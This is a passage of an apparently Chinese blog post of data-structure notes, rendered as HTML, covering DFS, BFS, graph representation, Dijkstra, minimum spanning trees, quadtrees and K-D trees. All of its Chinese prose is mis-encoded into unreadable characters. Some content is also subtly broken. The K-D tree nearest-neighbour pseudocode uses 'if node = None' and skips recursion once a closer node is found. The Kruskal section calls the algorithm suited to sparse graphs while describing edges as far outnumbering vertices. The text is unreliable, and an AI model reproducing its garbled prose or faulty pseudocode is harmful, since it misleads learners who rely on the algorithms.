class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">DFS(vertex):<br><span class="hljs-code">    å°†vertexæ ‡è®°ä¸ºå·²è®¿é—®</span><br><span class="hljs-code">    è®¿é—®vertex</span><br><span class="hljs-code">    </span><br><span class="hljs-code">    å¯¹äºvertexçš„æ¯ä¸ªæœªè®¿é—®çš„é‚»å±…neighborï¼š</span><br><span class="hljs-code">        å¦‚æœneighboræœªè¢«è®¿é—®ï¼š</span><br><span class="hljs-code">            é€’å½’è°ƒç”¨DFS(neighbor)</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ ˆæ¥ä¼˜åŒ–é€’å½’æ“ä½œï¼Œåœ¨è¿™é‡Œä¸åšå±•ç¤ºã€‚</p><p>æ·±åº¦ä¼˜å…ˆéå†ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º $O(V + E)$ ï¼Œå…¶ä¸­ $V$ æ˜¯é¡¶ç‚¹çš„æ•°é‡ï¼Œ$E$ æ˜¯è¾¹çš„æ•°é‡ã€‚</p><p>äº‹å®ä¸Šï¼Œæˆ‘ä»¬ä¹Ÿèƒ½ç”¨å¦ä¸€ç§æ€è·¯è§£å†³è¿™ä¸ªé—®é¢˜ï¼š<br>æˆ‘ä»¬å…ˆå°†ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰é‚»å±…è®¿é—®å®Œæˆï¼Œç„¶åé€å±‚å‘ä¸‹åœ°è®¿é—®å…¶å®ƒèŠ‚ç‚¹ã€‚è¿™ä¸€æ€æƒ³ç§°ä¸º<strong>å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBreadth-First Searchï¼ŒBFSï¼‰</strong>ã€‚æˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨é˜Ÿåˆ—æ¥è¿›è¡Œå®ç°ï¼š</p><ol><li>åœ¨éå†çš„è¿‡ç¨‹ä¸­ï¼Œå…ˆå°†èµ·å§‹é¡¶ç‚¹åŠ å…¥é˜Ÿåˆ—ï¼Œç„¶åé‡å¤ä»¥ä¸‹æ­¥éª¤ç›´åˆ°é˜Ÿåˆ—ä¸ºç©º</li><li>å¼¹å‡ºé˜Ÿåˆ—ä¸­çš„é¡¶ç‚¹ï¼Œå¹¶è®¿é—®è¯¥é¡¶ç‚¹ã€‚</li><li>éå†è¯¥é¡¶ç‚¹çš„æ‰€æœ‰é‚»å±…é¡¶ç‚¹ï¼Œå¦‚æœæŸä¸ªé‚»å±…é¡¶ç‚¹æœªè¢«è®¿é—®è¿‡ï¼Œåˆ™å°†å…¶åŠ å…¥é˜Ÿåˆ—ï¼Œå¹¶æ ‡è®°ä¸ºå·²è®¿é—®ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">BFS(Graph G, Vertex start):<br>    <span class="hljs-comment">// åˆå§‹åŒ–é˜Ÿåˆ—å¹¶å°†èµ·å§‹é¡¶ç‚¹å…¥é˜Ÿ</span><br>    Queue queue<br>    queue.enqueue(start)<br>    <span class="hljs-comment">// æ ‡è®°èµ·å§‹é¡¶ç‚¹ä¸ºå·²è®¿é—®</span><br>    mark start as visited<br>    <br>    <span class="hljs-comment">// å¾ªç¯ç›´åˆ°é˜Ÿåˆ—ä¸ºç©º</span><br>    <span class="hljs-keyword">while</span> queue is not empty:<br>        <span class="hljs-comment">// å¼¹å‡ºé˜Ÿåˆ—ä¸­çš„é¡¶ç‚¹ï¼Œå¹¶è®¿é—®è¯¥é¡¶ç‚¹</span><br>        current = queue.dequeue()<br>        visit current<br>        <br>        <span class="hljs-comment">// éå†å½“å‰é¡¶ç‚¹çš„æ‰€æœ‰é‚»å±…é¡¶ç‚¹</span><br>        <span class="hljs-keyword">for</span> each neighbor of current:<br>            <span class="hljs-comment">// å¦‚æœé‚»å±…é¡¶ç‚¹æœªè¢«è®¿é—®è¿‡</span><br>            <span class="hljs-keyword">if</span> neighbor is not visited:<br>                <span class="hljs-comment">// å°†é‚»å±…é¡¶ç‚¹æ ‡è®°ä¸ºå·²è®¿é—®ï¼Œå¹¶å…¥é˜Ÿ</span><br>                mark neighbor as visited<br>                queue.enqueue(neighbor)<br></code></pre></td></tr></table></figure><h2 id="Graph-Representing"><a href="#Graph-Representing" class="headerlink" title="Graph Representing"></a>Graph Representing</h2><p>è¡¨ç¤ºå›¾çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œå¸¸è§çš„æ˜¯ç”¨é‚»æ¥çŸ©é˜µ(Adjacency Matrix)å’Œé‚»æ¥è¡¨(Adjacency Lists)ã€‚</p><h3 id="Adjacency-Matrix"><a href="#Adjacency-Matrix" class="headerlink" title="Adjacency Matrix"></a>Adjacency Matrix</h3><p>ä½¿ç”¨äºŒç»´æ•°ç»„ã€‚æœ‰ä¸€æ¡è¾¹å°†é¡¶ç‚¹ s è¿æ¥åˆ° t ï¼Œå‰ææ˜¯ç›¸åº”çš„å•å…ƒæ ¼æ˜¯ 1 ï¼ˆè¡¨ç¤º true ï¼‰ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœå›¾æ˜¯æ— å‘çš„ï¼Œåˆ™é‚»æ¥çŸ©é˜µå°†åœ¨å…¶å¯¹è§’çº¿ä¸Šï¼ˆä»å·¦ä¸Šè§’åˆ°å³ä¸‹è§’ï¼‰å¯¹ç§°ã€‚  </p><h3 id="Adjacency-Lists"><a href="#Adjacency-Lists" class="headerlink" title="Adjacency Lists"></a>Adjacency Lists</h3><p>ç»´æŠ¤ä¸€ä¸ªåˆ—è¡¨æ•°ç»„ï¼ŒæŒ‰é¡¶ç‚¹å·ç´¢å¼•ã€‚å¦‚æœå­˜åœ¨ä» s åˆ° t çš„è¾¹ï¼Œåˆ™æ•°ç»„ç´¢å¼• s å¤„çš„åˆ—è¡¨å°†åŒ…å« t ã€‚</p><h2 id="Shortest-Pathsâ€“Dijkstraâ€™s-Algorithm"><a href="#Shortest-Pathsâ€“Dijkstraâ€™s-Algorithm" class="headerlink" title="Shortest Pathsâ€“Dijkstraâ€™s Algorithm"></a>Shortest Pathsâ€“Dijkstraâ€™s Algorithm</h2><p>Dijkstraç®—æ³•æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­çš„ä¸€ç§æµè¡Œç®—æ³•ï¼Œç”¨äºåœ¨å›¾ä¸­æ‰¾åˆ°èŠ‚ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ï¼Œç‰¹åˆ«æ˜¯åœ¨å…·æœ‰éè´Ÿè¾¹æƒé‡çš„å›¾ä¸­ã€‚<br>è¯¥ç®—æ³•é€šè¿‡è¿­ä»£åœ°é€‰æ‹©ä»æºèŠ‚ç‚¹å¼€å§‹çš„å·²çŸ¥è·ç¦»æœ€å°çš„èŠ‚ç‚¹ï¼Œå¹¶åœ¨å‘ç°æ›´çŸ­è·¯å¾„æ—¶æ›´æ–°å…¶ç›¸é‚»èŠ‚ç‚¹çš„è·ç¦»æ¥è¿ä½œã€‚å®ƒé€šè¿‡ç»´æŠ¤ä¸€ä¸ªä¼˜å…ˆé˜Ÿåˆ—ï¼ˆé€šå¸¸ç”¨æœ€å°å †å®ç°ï¼‰æ¥é«˜æ•ˆåœ°é€‰æ‹©ä¸‹ä¸€ä¸ªè¦æ¢ç´¢çš„èŠ‚ç‚¹ã€‚</p><p>ä»¥ä¸‹æ˜¯Dijkstraç®—æ³•çš„æ­¥éª¤æ¦‚è¿°ï¼š</p><ol><li><p>åˆå§‹åŒ–ï¼š å°†æºèŠ‚ç‚¹çš„è·ç¦»è®¾ç½®ä¸º0ï¼Œå°†æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹çš„è·ç¦»è®¾ç½®ä¸ºæ— ç©·å¤§ã€‚åˆå§‹åŒ–ä¸€ä¸ªç©ºçš„ä¼˜å…ˆé˜Ÿåˆ—ï¼ˆæˆ–æœ€å°å †ï¼‰ï¼Œç”¨äºæŒ‰è·ç¦»æ’åºçš„èŠ‚ç‚¹ã€‚</p></li><li><p>é€‰æ‹©ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼š ä»ä¼˜å…ˆé˜Ÿåˆ—ä¸­æå–å…·æœ‰æœ€å°è·ç¦»çš„èŠ‚ç‚¹ã€‚æœ€åˆï¼Œè¿™å°†æ˜¯æºèŠ‚ç‚¹ã€‚</p></li><li><p>æ›´æ–°ç›¸é‚»èŠ‚ç‚¹ï¼š å¯¹äºå½“å‰èŠ‚ç‚¹çš„æ¯ä¸ªç›¸é‚»èŠ‚ç‚¹ï¼Œè®¡ç®—é€šè¿‡å½“å‰èŠ‚ç‚¹åˆ°æºèŠ‚ç‚¹çš„è·ç¦»ã€‚å¦‚æœæ­¤è·ç¦»æ¯”å…ˆå‰å·²çŸ¥çš„è·ç¦»æ›´çŸ­ï¼Œåˆ™æ›´æ–°ç›¸é‚»èŠ‚ç‚¹çš„è·ç¦»å¹¶æ›´æ–°å…¶çˆ¶èŠ‚ç‚¹ï¼ˆæ‰¾åˆ°æœ€çŸ­è·¯å¾„çš„èŠ‚ç‚¹ï¼‰ã€‚å°†æ›´æ–°åçš„ç›¸é‚»èŠ‚ç‚¹æ’å…¥ä¼˜å…ˆé˜Ÿåˆ—ã€‚</p></li><li><p>é‡å¤ï¼š é‡å¤æ­¥éª¤2å’Œ3ï¼Œç›´åˆ°æ‰€æœ‰èŠ‚ç‚¹éƒ½è¢«å¤„ç†æˆ–è¾¾åˆ°ç›®æ ‡èŠ‚ç‚¹ã€‚</p></li><li><p>æœ€çŸ­è·¯å¾„é‡å»ºï¼š ä¸€æ—¦åˆ°è¾¾ç›®æ ‡èŠ‚ç‚¹æˆ–æ‰€æœ‰èŠ‚ç‚¹éƒ½å·²å¤„ç†ï¼Œå°±å¯ä»¥é€šè¿‡åœ¨ç®—æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­å­˜å‚¨çš„çˆ¶æŒ‡é’ˆå›æº¯ä»ç›®æ ‡èŠ‚ç‚¹åˆ°æºèŠ‚ç‚¹ï¼Œé‡å»ºä»æºåˆ°ç›®æ ‡çš„æœ€çŸ­è·¯å¾„ã€‚</p></li></ol><p>ä¸‹é¢æ˜¯ä¸€ä¸ªå¯èƒ½çš„ä¼ªä»£ç å®ç°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Dijkstra</span>(<span class="hljs-params">graph, source</span>):<br>    dist[source] = <span class="hljs-number">0</span> // åˆ°æºèŠ‚ç‚¹çš„è·ç¦»ä¸º<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> each vertex v <span class="hljs-keyword">in</span> graph:<br>        <span class="hljs-keyword">if</span> v â‰  source:<br>            dist[v] = âˆ // åˆ°å…¶ä»–èŠ‚ç‚¹çš„è·ç¦»åˆå§‹åŒ–ä¸ºæ— ç©·å¤§<br>        add v to priority queue <span class="hljs-keyword">with</span> priority dist[v]<br>    <br>    <span class="hljs-keyword">while</span> priority queue <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> empty:<br>        u = remove vertex <span class="hljs-keyword">with</span> minimum dist[u] <span class="hljs-keyword">from</span> priority queue<br>        <span class="hljs-keyword">for</span> each neighbor v of u:<br>            alt = dist[u] + weight(u, v) // è®¡ç®—é€šè¿‡uåˆ°è¾¾vçš„è·ç¦»<br>            <span class="hljs-keyword">if</span> alt &lt; dist[v]: // å¦‚æœé€šè¿‡uåˆ°è¾¾vçš„è·ç¦»æ›´çŸ­<br>                dist[v] = alt // æ›´æ–°åˆ°vçš„æœ€çŸ­è·ç¦»<br>                update priority queue <span class="hljs-keyword">with</span> new priority dist[v] // æ›´æ–°ä¼˜å…ˆé˜Ÿåˆ—ä¸­vçš„ä¼˜å…ˆçº§<br></code></pre></td></tr></table></figure><h1 id="Minimum-Spanning-Trees"><a href="#Minimum-Spanning-Trees" class="headerlink" title="Minimum Spanning Trees"></a>Minimum Spanning Trees</h1><p>æœ€å°ç”Ÿæˆæ ‘ï¼ˆMinimum Spanning Treeï¼ŒMSTï¼‰æ˜¯ä¸€ç§åœ¨è¿é€šåŠ æƒå›¾ä¸­æ‰¾åˆ°çš„ç‰¹æ®Šæ ‘å½¢ç»“æ„ï¼Œå®ƒåŒ…å«äº†å›¾ä¸­çš„æ‰€æœ‰é¡¶ç‚¹ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªæ ‘ï¼Œæ²¡æœ‰ç¯è·¯ï¼ŒåŒæ—¶æƒé‡ä¹‹å’Œæœ€å°ã€‚</p><p>å‰²é›†ï¼ˆCut Setï¼‰æ˜¯æŒ‡ä¸€ä¸ªå›¾ä¸­çš„è¾¹é›†åˆï¼Œå½“è¿™äº›è¾¹è¢«ç§»é™¤åï¼ŒåŸæœ¬è¿é€šçš„å›¾è¢«åˆ†å‰²æˆä¸¤ä¸ªæˆ–å¤šä¸ªä¸ç›¸è¿çš„å­å›¾ã€‚æ¢å¥è¯è¯´ï¼Œå‰²é›†æ˜¯ä¸€ç»„è¾¹ï¼Œå®ƒä»¬çš„ç§»é™¤ä¼šä½¿å¾—å›¾ä¸­çš„é¡¶ç‚¹å¤±å»è¿æ¥ï¼Œå¯¼è‡´å›¾åˆ†è£‚æˆå¤šä¸ªè¿é€šåˆ†é‡ã€‚</p><p>è¿æ”¯ï¼ˆConnected Componentsï¼‰æ˜¯æŒ‡å›¾ä¸­çš„ä¸€ç»„é¡¶ç‚¹ï¼Œå®ƒä»¬ä¹‹é—´æœ‰è·¯å¾„ç›¸è¿ï¼Œå¹¶ä¸”æ²¡æœ‰å…¶ä»–çš„é¡¶ç‚¹ä¸è¿™äº›é¡¶ç‚¹ç›¸è¿ã€‚è¿æ”¯æ˜¯ç”±é¡¶ç‚¹ç»„æˆçš„é›†åˆï¼Œç”¨äºæè¿°å›¾çš„è¿é€šæ€§ã€‚</p><p>å¯»æ‰¾è¿é€šå›¾çš„æœ€å°ç”Ÿæˆæ ‘ï¼Œä¸€èˆ¬è€Œè¨€æœ‰ä¸¤ç§ç®—æ³•ï¼Œå‡åŸºäºè´ªå¿ƒæ€æƒ³ï¼š</p><ol><li>Kruskal ç®—æ³•</li><li>Prim ç®—æ³•</li></ol><p>æ—¶é—´å¤æ‚åº¦å‡ä¸º $O(E\log{}{V})$ ã€‚</p><h2 id="Primâ€™s-Algorithm"><a href="#Primâ€™s-Algorithm" class="headerlink" title="Primâ€™s Algorithm"></a>Primâ€™s Algorithm</h2><p>åŸºæœ¬æ€æƒ³ï¼š<br>Prim ç®—æ³•ä¹Ÿæ˜¯ä¸€ç§è´ªå¿ƒç­–ç•¥ï¼Œä»ä¸€ä¸ªåˆå§‹é¡¶ç‚¹å¼€å§‹ï¼Œé€æ­¥æ‰©å±•æœ€å°ç”Ÿæˆæ ‘ï¼Œæ¯æ¬¡é€‰æ‹©ä¸å½“å‰æœ€å°ç”Ÿæˆæ ‘ç›¸è¿çš„æƒé‡æœ€å°çš„è¾¹ï¼Œå¹¶ä¸”ä¸ä¼šå½¢æˆç¯è·¯ã€‚</p><p>Prim ç®—æ³•åœ¨ç¨ å¯†å›¾ä¸­æ•ˆæœæ›´å¥½ï¼Œé€‚ç”¨äºè¾¹çš„æ•°é‡ä¸é¡¶ç‚¹æ•°é‡ç›¸å½“çš„æƒ…å†µã€‚</p><p>æ­¥éª¤ï¼š</p><ol><li>é€‰æ‹©ä¸€ä¸ªèµ·å§‹é¡¶ç‚¹ä½œä¸ºåˆå§‹æ ‘ã€‚</li><li>å°†ä¸åˆå§‹æ ‘ç›¸è¿çš„è¾¹åŠ å…¥å€™é€‰è¾¹é›†åˆä¸­ã€‚</li><li>ä»å€™é€‰è¾¹é›†åˆä¸­é€‰æ‹©æƒé‡æœ€å°çš„è¾¹ï¼Œå°†å…¶åŠ å…¥æœ€å°ç”Ÿæˆæ ‘ï¼Œå¹¶å°†å…¶æ‰€è¿æ¥çš„é¡¶ç‚¹åŠ å…¥æœ€å°ç”Ÿæˆæ ‘çš„é¡¶ç‚¹é›†åˆä¸­ã€‚</li><li>é‡å¤æ­¥éª¤3ï¼Œç›´åˆ°æœ€å°ç”Ÿæˆæ ‘åŒ…å«äº†å›¾ä¸­çš„æ‰€æœ‰é¡¶ç‚¹ã€‚</li></ol><h2 id="Kruskalâ€™s-Algorithm"><a href="#Kruskalâ€™s-Algorithm" class="headerlink" title="Kruskalâ€™s Algorithm"></a>Kruskalâ€™s Algorithm</h2><p>åŸºæœ¬æ€æƒ³ï¼š<br>Kruskal ç®—æ³•åŸºäºè´ªå¿ƒç­–ç•¥ï¼Œæ¯æ¬¡é€‰æ‹©æƒé‡æœ€å°çš„è¾¹ï¼Œå¦‚æœè¿™æ¡è¾¹ä¸å½¢æˆç¯è·¯ï¼Œåˆ™å°†å…¶åŠ å…¥æœ€å°ç”Ÿæˆæ ‘ã€‚</p><p>Kruskal ç®—æ³•å¯¹äºç¨€ç–å›¾æ•ˆæœè¾ƒå¥½ï¼Œé€‚ç”¨äºè¾¹çš„æ•°é‡è¿œè¿œå¤§äºé¡¶ç‚¹æ•°é‡çš„æƒ…å†µã€‚</p><p>æ­¥éª¤ï¼š</p><ol><li>å°†å›¾ä¸­çš„æ‰€æœ‰è¾¹æŒ‰ç…§æƒé‡ä»å°åˆ°å¤§æ’åºã€‚</li><li>ä¾æ¬¡ä»æ’åºåçš„è¾¹é›†åˆä¸­é€‰å–è¾¹ï¼Œå¦‚æœé€‰å–çš„è¾¹ä¸ä¼šå½¢æˆç¯è·¯ï¼ˆå³åŠ å…¥è¿™æ¡è¾¹åä¸ä¼šå‡ºç°ç¯è·¯ï¼‰ï¼Œåˆ™å°†å…¶åŠ å…¥æœ€å°ç”Ÿæˆæ ‘ã€‚</li><li>é‡å¤æ­¥éª¤2ï¼Œç›´åˆ°æœ€å°ç”Ÿæˆæ ‘ä¸­åŒ…å«äº†å›¾ä¸­çš„æ‰€æœ‰é¡¶ç‚¹ä¸ºæ­¢ã€‚</li></ol><h1 id="Mutidimensional-Data"><a href="#Mutidimensional-Data" class="headerlink" title="Mutidimensional Data"></a>Mutidimensional Data</h1><p>å¯¹äºä¸€ç»´æ•°æ®çš„å­˜å‚¨ï¼Œæˆ‘ä»¬æœ‰ååˆ†ç®€ä¾¿çš„æ¯”è¾ƒå¤§å°çš„æ–¹å¼ã€‚ä½†æ˜¯å¯¹äºäºŒç»´ä¹ƒè‡³äºå¤šç»´çš„æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åˆ†ç±»ï¼Œä¸€ä¸ªä¾æ®æ˜¯æ¯ä¸ªç»´åº¦è¿›è¡Œå¤§å°çš„æ¯”è¾ƒï¼Œè¿™æ—¶å€™å°±éœ€è¦å¢åŠ æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°æ¥è¡¨ç¤ºä¸åŒçš„åŒºé—´ã€‚</p><h2 id="Quadtree"><a href="#Quadtree" class="headerlink" title="Quadtree"></a>Quadtree</h2><p>å››å‰æ ‘ï¼ˆQuadtreeï¼‰æ˜¯ä¸€ç§ç”¨äºè¡¨ç¤ºäºŒç»´ç©ºé—´çš„æ ‘å½¢æ•°æ®ç»“æ„ï¼Œå®ƒå°†äºŒç»´ç©ºé—´é€’å½’åœ°åˆ’åˆ†ä¸ºå››ä¸ªè±¡é™ï¼Œæ¯ä¸ªè±¡é™å¯ä»¥ç»§ç»­åˆ’åˆ†ä¸ºå››ä¸ªå­è±¡é™ï¼Œä»¥æ­¤ç±»æ¨ã€‚å››å‰æ ‘å¸¸ç”¨äºè¡¨ç¤ºå’Œç®¡ç†äºŒç»´æ•°æ®ã€‚</p><ol><li>ç©ºé—´åˆ’åˆ†ï¼šå››å‰æ ‘å°†äºŒç»´ç©ºé—´åˆ’åˆ†ä¸ºå››ä¸ªè±¡é™ï¼šå·¦ä¸Šã€å³ä¸Šã€å·¦ä¸‹ã€å³ä¸‹ã€‚æ¯ä¸ªè±¡é™å¯ä»¥ç»§ç»­åˆ’åˆ†ä¸ºå››ä¸ªå­è±¡é™ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°è¾¾åˆ°æŸä¸ªç»ˆæ­¢æ¡ä»¶ã€‚</li><li>èŠ‚ç‚¹ç»“æ„ï¼šå››å‰æ ‘çš„èŠ‚ç‚¹åŒ…å«å››ä¸ªæŒ‡é’ˆï¼Œåˆ†åˆ«æŒ‡å‘å…¶å››ä¸ªå­èŠ‚ç‚¹ã€‚å¦‚æœä¸€ä¸ªèŠ‚ç‚¹æ²¡æœ‰å­èŠ‚ç‚¹ï¼Œåˆ™ç§°ä¸ºå¶å­èŠ‚ç‚¹ã€‚å¶å­èŠ‚ç‚¹é€šå¸¸åŒ…å«ç›¸åº”åŒºåŸŸå†…çš„æ•°æ®ã€‚</li><li>æŸ¥è¯¢æ“ä½œï¼šå››å‰æ ‘å¯ä»¥å¿«é€Ÿè¿›è¡ŒåŒºåŸŸæŸ¥è¯¢å’ŒèŒƒå›´æŸ¥è¯¢ã€‚åŒºåŸŸæŸ¥è¯¢ç”¨äºæŸ¥æ‰¾è½åœ¨ç»™å®šåŒºåŸŸå†…çš„æ‰€æœ‰æ•°æ®ç‚¹ï¼Œè€ŒèŒƒå›´æŸ¥è¯¢ç”¨äºæŸ¥æ‰¾ä¸ç»™å®šç‚¹è·ç¦»ä¸è¶…è¿‡ä¸€å®šèŒƒå›´å†…çš„æ‰€æœ‰æ•°æ®ç‚¹ã€‚</li><li>ç©ºé—´åˆ†æï¼šå››å‰æ ‘å¯ä»¥ç”¨äºè¿›è¡Œç©ºé—´åˆ†æï¼Œå¦‚åˆ¤æ–­ä¸¤ä¸ªåŒºåŸŸæ˜¯å¦ç›¸äº¤ã€è®¡ç®—åŒºåŸŸçš„é¢ç§¯ã€æŸ¥æ‰¾æœ€è¿‘é‚»ç‚¹ç­‰ã€‚</li></ol><h2 id="K-D-Trees"><a href="#K-D-Trees" class="headerlink" title="K-D Trees"></a>K-D Trees</h2><p>KD æ ‘ï¼ˆK-Dimensional Treeï¼‰æ˜¯ä¸€ç§äºŒå‰æ ‘æ•°æ®ç»“æ„ï¼Œç”¨äºå¯¹ k ç»´ç©ºé—´ä¸­çš„æ•°æ®è¿›è¡Œåˆ†å‰²å’Œç»„ç»‡ã€‚KD æ ‘å¸¸è¢«ç”¨äºå¯¹å¤šç»´æ•°æ®è¿›è¡Œæœç´¢ã€èŒƒå›´æŸ¥è¯¢å’Œæœ€è¿‘é‚»æœç´¢ç­‰æ“ä½œã€‚</p><ol><li>ç©ºé—´åˆ’åˆ†ï¼šKD æ ‘é€šè¿‡é€’å½’åœ°å°† k ç»´ç©ºé—´åˆ’åˆ†ä¸ºè½´å¯¹é½çš„è¶…çŸ©å½¢åŒºåŸŸã€‚æ¯ä¸ªèŠ‚ç‚¹ä»£è¡¨ä¸€ä¸ªè¶…çŸ©å½¢åŒºåŸŸï¼Œå…¶å­èŠ‚ç‚¹å¯¹åº”äºè¯¥åŒºåŸŸè¢«åˆ†å‰²åçš„å­åŒºåŸŸã€‚</li><li>è½´é€‰æ‹©ï¼šåœ¨æ„å»º KD æ ‘æ—¶ï¼Œæ¯æ¬¡é€‰æ‹©ä¸€ä¸ªåæ ‡è½´ä½œä¸ºåˆ‡åˆ†çš„ä¾æ®ã€‚é€šå¸¸ï¼Œè½´çš„é€‰æ‹©æ˜¯äº¤æ›¿è¿›è¡Œçš„ï¼Œæ¯”å¦‚åœ¨äºŒç»´ç©ºé—´ä¸­å°±æ˜¯äº¤æ›¿é€‰æ‹© x è½´å’Œ y è½´ã€‚</li><li>èŠ‚ç‚¹ç»“æ„ï¼šKD æ ‘çš„èŠ‚ç‚¹åŒ…å«ä¸€ä¸ªæ•°æ®ç‚¹ä»¥åŠæŒ‡å‘å·¦å³å­èŠ‚ç‚¹çš„æŒ‡é’ˆã€‚æ ¹æ®é€‰æ‹©çš„åˆ‡åˆ†è½´ï¼Œå·¦å­èŠ‚ç‚¹çš„æ•°æ®ç‚¹åœ¨è¯¥è½´ä¸Šå°äºå½“å‰èŠ‚ç‚¹çš„å€¼ï¼Œå³å­èŠ‚ç‚¹çš„æ•°æ®ç‚¹åœ¨è¯¥è½´ä¸Šå¤§äºå½“å‰èŠ‚ç‚¹çš„å€¼ã€‚</li><li>æœç´¢æ“ä½œï¼šKD æ ‘å¯ä»¥ç”¨äºèŒƒå›´æŸ¥è¯¢å’Œæœ€è¿‘é‚»æœç´¢ã€‚èŒƒå›´æŸ¥è¯¢ç”¨äºæŸ¥æ‰¾è½åœ¨ç»™å®šè¶…çŸ©å½¢åŒºåŸŸå†…çš„æ‰€æœ‰æ•°æ®ç‚¹ï¼Œæœ€è¿‘é‚»æœç´¢ç”¨äºæŸ¥æ‰¾ç¦»ç»™å®šç‚¹æœ€è¿‘çš„æ•°æ®ç‚¹ã€‚</li></ol><p>æ„å»º KD æ ‘çš„æ­¥éª¤ï¼š</p><ol><li>é€‰æ‹©åˆå§‹è½´ï¼ˆé€šå¸¸æ˜¯åæ ‡è½´ï¼‰ã€‚</li><li>æ ¹æ®é€‰å®šçš„è½´ï¼Œæ‰¾åˆ°ä¸­ä½æ•°ï¼Œå°†æ•°æ®é›†åˆ†ä¸ºä¸¤éƒ¨åˆ†ã€‚</li><li>é€’å½’åœ°æ„å»ºå·¦å³å­æ ‘ï¼Œé‡å¤æ­¥éª¤ 1 å’Œæ­¥éª¤ 2ï¼Œç›´åˆ°æ¯ä¸ªåŒºåŸŸåªåŒ…å«ä¸€ä¸ªæ•°æ®ç‚¹ä¸ºæ­¢ã€‚</li></ol><p>æœ€è¿‘é‚»æœç´¢ç®—æ³•ï¼ˆNearest Neighbor Searchï¼‰ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">NNS</span>(<span class="hljs-params">root, target</span>):<br>    best_node = <span class="hljs-literal">None</span><br>    best_distance = <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">nearest</span>(<span class="hljs-params">node</span>):<br>        <span class="hljs-keyword">if</span> node = <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span><br>        axis = node.axis<br>        <span class="hljs-comment"># è¿™é‡Œçš„distanceä¸€èˆ¬æŒ‡æ¬§æ°è·ç¦»</span><br>        current_distance = distance(node, target)<br>        <span class="hljs-keyword">if</span> current_distance &lt; best_distance:<br>            best_node = node<br>            best_distance = current_distance<br>        <span class="hljs-keyword">elif</span> target[axis] &lt; node[axis]:<br>            nearest(node.left)<br>            <span class="hljs-keyword">if</span> target[axis] + best_distance &gt;= node[axis]:<br>                nearest(node.right)<br>        <span class="hljs-keyword">else</span>:<br>            nearest(node.right)<br>            <span class="hljs-keyword">if</span> target[axis] - best_distance &lt;= node[axis]:<br>                nearest(node.left)<br></code></pre></td></tr></table></figure><h1 id="Prefix-Operations-and-Tire"><a href="#Prefix-Operations-and-Tire" class="headerlink" title="Prefix Operations and Tire"></a>Prefix Operations and Tire</h1><p>å‰ç¼€æ“ä½œï¼ˆPrefix operationï¼‰æ˜¯ä¸€ç§æ•°å­¦å’Œè®¡ç®—æœºç§‘å­¦ä¸­çš„æ“ä½œç¬¦è¡¨ç¤ºæ³•ï¼Œå…¶ä¸­è¿ç®—ç¬¦ä½äºå…¶æ“ä½œæ•°ä¹‹å‰ã€‚è¿™ç§è¡¨ç¤ºæ³•ä¹Ÿç§°ä¸ºæ³¢å…°è®°æ³•æˆ–å‰ç¼€è¡¨ç¤ºæ³•ã€‚åœ¨å‰ç¼€è¡¨ç¤ºæ³•ä¸­ï¼Œè¿ç®—ç¬¦ä½äºæ“ä½œæ•°ä¹‹å‰ï¼Œè¿™ä¸æˆ‘ä»¬é€šå¸¸ä½¿ç”¨çš„ä¸­ç¼€è¡¨ç¤ºæ³•ï¼ˆå¦‚2 + 3ï¼‰æˆ–åç¼€è¡¨ç¤ºæ³•ï¼ˆé€†æ³¢å…°è¡¨ç¤ºæ³•ï¼Œå¦‚2 3 +ï¼‰ä¸åŒã€‚</p><p>ä¾‹å¦‚ï¼Œå¸¸è§çš„ç®—æœ¯è¡¨è¾¾å¼â€œ2 + 